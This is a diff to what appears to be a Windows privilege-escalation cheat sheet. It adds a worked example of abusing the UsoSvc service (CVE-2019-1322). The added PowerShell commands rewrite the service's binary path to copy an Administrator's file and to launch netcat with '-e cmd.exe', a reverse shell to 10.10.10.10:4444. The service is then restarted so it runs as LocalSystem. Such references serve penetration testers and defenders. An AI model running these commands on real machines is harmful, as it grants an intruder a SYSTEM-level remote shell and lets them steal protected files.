@@ -483,7 +483,33 @@ Note to check file permissions you can use `cacls` and `icacls`
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
 
-### Example with Windows XP SP1
+### Example with Windows 10 - CVE-2019-1322 UsoSvc
+
+Prerequisite: Service account
+
+```powershell
+PS C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\a.txt"
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+### Example with Windows XP SP1 - upnphost
 
 ```powershell
 # NOTE: spaces are mandatory for this exploit to work !
